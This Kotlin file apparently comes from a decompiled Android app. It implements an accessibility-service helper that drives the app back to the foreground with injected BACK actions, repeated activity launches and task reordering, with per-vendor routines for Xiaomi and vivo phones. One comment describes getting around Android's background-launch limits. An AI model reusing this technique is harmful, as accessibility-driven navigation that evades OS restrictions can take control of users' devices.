package com.storm.safe.rock.service.delegates

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Build
import com.storm.safe.rock.service.MyAccessibilityService
import java.util.Locale

/**
 * Smart navigation delegate — returns our app to foreground.
 * Extracted from MyAccessibilityService.
 *
 * JADX: m211524m1 (smartReturnToApp), m211526m3 (Xiaomi M3),
 *       m211525m2 (Xiaomi M2), m211472h7 (isCurrentlyInOurApp),
 *       generic path within m211524m1.
 */
class SmartNavigator(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "SmartNavigator"
    }

    /**
     * Smart return to app. JADX: m211524m1
     *
     * Vendor routing via m211427e0() (detectXiaomiVersion):
     *   SDK 29 → m2 (smartReturnToAppXiaomiM2)
     *   SDK 33/34 → m3 (smartReturnToAppXiaomiM3)
     *   SDK 35+ or non-Xiaomi → generic path (iuzxujjtqev + BACK loop)
     */
    suspend fun smartReturnToApp(): Boolean {
        return try {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] 开始执行...")
            val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
            val sdk = Build.VERSION.SDK_INT
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] brand=$brand, SDK=$sdk")

            // JADX m211427e0: detectXiaomiVersion — only SDK 29/33/34 get special treatment
            val isXiaomi = brand.contains("xiaomi") || brand.contains("redmi") || brand.contains("poco")
            if (isXiaomi) {
                android.util.Log.d(TAG, "✅ [设备] 检测到小米设备, SDK=$sdk")
                when (sdk) {
                    29 -> return smartReturnToAppXiaomiM2()
                    33, 34 -> return smartReturnToAppXiaomiM3()
                    else -> {
                        // SDK 35+ or other: vendor returns null, falls through to generic
                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] 小米SDK=$sdk, 走通用路径")
                    }
                }
            }

            // 通用路径: 先启动 Activity，再 BACK 循环
            return smartReturnToAppGeneric(brand, sdk)
        } catch (e: Exception) {
            android.util.Log.w(TAG, "smartReturnToApp failed: ${e.message}")
            false
        }
    }

    /**
     * 小米 Android 13+ 策略 (m3)。JADX: m211526m3, line 8909
     * Phase 1: startActivity + delay(1500) → 检测
     * Phase 2: 3次快速BACK(500ms间隔) → 检测
     * Phase 3: 再次startActivity + delay(1000) → 最终检测
     */
    internal suspend fun smartReturnToAppXiaomiM3(): Boolean {
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 开始 (Activity + BACK + Activity 兜底)")

        val intent = Intent(service, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
            addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                Intent.FLAG_ACTIVITY_CLEAR_TOP or
                Intent.FLAG_ACTIVITY_SINGLE_TOP
            )
            putExtra("MI_ANDROID13_RETURN", true)
            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
        }

        // Phase 1: 直接 startActivity
        try {
            service.startActivity(intent)
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase1: Activity已启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [Xiaomi-m3] Phase1: 启动失败", e)
        }
        kotlinx.coroutines.delay(1500L)

        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase1 成功")
            return true
        }

        // Phase 2: 3次快速 BACK
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase2: 3次BACK")
        for (i in 1..3) {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            kotlinx.coroutines.delay(500L)
        }

        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [Xiaomi-m3] ✅ Phase2 BACK成功")
            return true
        }

        // Phase 3: 再次 startActivity 兜底
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] Phase3: 再次startActivity兜底")
        try {
            service.startActivity(intent)
        } catch (_: Exception) {}
        kotlinx.coroutines.delay(1000L)

        val result = isCurrentlyInOurApp()
        android.util.Log.d(TAG, "🏠 [Xiaomi-m3] 最终结果=$result")
        return result
    }

    /**
     * 小米 Android 10 策略 (m2)。JADX: m211525m2, line 8791
     * 纯 BACK 策略: 2次BACK → 失败后 startActivity 兜底
     */
    internal suspend fun smartReturnToAppXiaomiM2(): Boolean {
        android.util.Log.d(TAG, "🏠 [Xiaomi-m2] 开始 (BACK + Activity 兜底)")

        if (isCurrentlyInOurApp()) return true

        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        kotlinx.coroutines.delay(500L)
        if (isCurrentlyInOurApp()) return true

        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        kotlinx.coroutines.delay(500L)
        if (isCurrentlyInOurApp()) return true

        // 兜底: startActivity
        try {
            val intent = Intent(service, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                putExtra("MI_ANDROID10_RETURN", true)
                putExtra("FROM_ACCESSIBILITY_SERVICE", true)
            }
            service.startActivity(intent)
        } catch (_: Exception) {}
        kotlinx.coroutines.delay(500L)
        return isCurrentlyInOurApp()
    }

    /** JADX: m211472h7 — 检测当前是否在自己的 app */
    fun isCurrentlyInOurApp(): Boolean {
        // Method 1: rootInActiveWindow（快但不可靠，可能返回旧窗口）
        try {
            if (service.rootInActiveWindow?.packageName?.toString() == service.packageName) return true
        } catch (_: Exception) {}
        // Method 2: 遍历 windows 查找我们的 app 窗口是否 active
        try {
            for (w in service.windows ?: emptyList()) {
                if (w.isActive && w.root?.packageName?.toString() == service.packageName) return true
            }
        } catch (_: Exception) {}
        // Method 3: 检查 Activity 引用是否存在且未销毁
        try {
            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
            if (act != null && !act.isFinishing && !act.isDestroyed) {
                if (act.hasWindowFocus()) return true
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * 通用返回策略。JADX: m211524m1 通用路径
     * 先启动 Activity，再最多 6 次 BACK + 稳定性验证。
     */
    internal suspend fun smartReturnToAppGeneric(brand: String, sdk: Int): Boolean {
        val intent = Intent(service, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            putExtra("SMART_RETURN_BACKUP", true)
            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
        }

        // Phase 0: moveTaskToFront（最可靠 — 绕过 BAL 限制，走 REORDER_TASKS 权限路径）
        try {
            val am = service.getSystemService(android.content.Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
            // Strategy A: AppTask.moveToFront
            am?.appTasks?.forEach { task ->
                try {
                    if (task.taskInfo?.baseActivity?.packageName == service.packageName) {
                        task.moveToFront()
                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: AppTask.moveToFront")
                    }
                } catch (_: Exception) {}
            }
            kotlinx.coroutines.delay(1000L)
            if (isCurrentlyInOurApp()) {
                android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 AppTask 成功")
                return true
            }
            // Strategy B: moveTaskToFront(taskId)
            val taskId = com.storm.safe.rock.iuzxujjtqev.lastKnownTaskId
            if (taskId > 0) {
                am?.moveTaskToFront(taskId, android.app.ActivityManager.MOVE_TASK_WITH_HOME)
                android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: moveTaskToFront(taskId=$taskId)")
                kotlinx.coroutines.delay(1000L)
                if (isCurrentlyInOurApp()) {
                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 taskId 成功")
                    return true
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "🏠 [smartReturnToApp] Phase0 失败: ${e.message}")
        }

        // Phase 1: startActivity（简单场景有效）
        try {
            service.startActivity(intent)
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase1: startActivity")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [smartReturnToApp] 启动Activity失败: ${e.message}", e)
        }
        kotlinx.coroutines.delay(2000L)
        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase1 成功")
            return true
        }

        // Phase 2: BACK 回退兜底
        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase2: BACK循环")
        val backDelay = if (brand.contains("vivo") && sdk >= 31) 1000L else 500L
        for (i in 0 until 6) {
            if (isCurrentlyInOurApp()) {
                kotlinx.coroutines.delay(backDelay)
                if (isCurrentlyInOurApp()) {
                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase2 BACK第${i}次后稳定在app")
                    return true
                }
            }
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] BACK第${i + 1}次")
            kotlinx.coroutines.delay(backDelay)
        }
        // 最后再试一次 startActivity
        try { service.startActivity(intent) } catch (_: Exception) {}
        kotlinx.coroutines.delay(2000L)
        if (isCurrentlyInOurApp()) {
            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase3 最终startActivity成功")
            return true
        }

        android.util.Log.w(TAG, "🏠 [smartReturnToApp] ❌ 全部策略失败")
        return false
    }
}
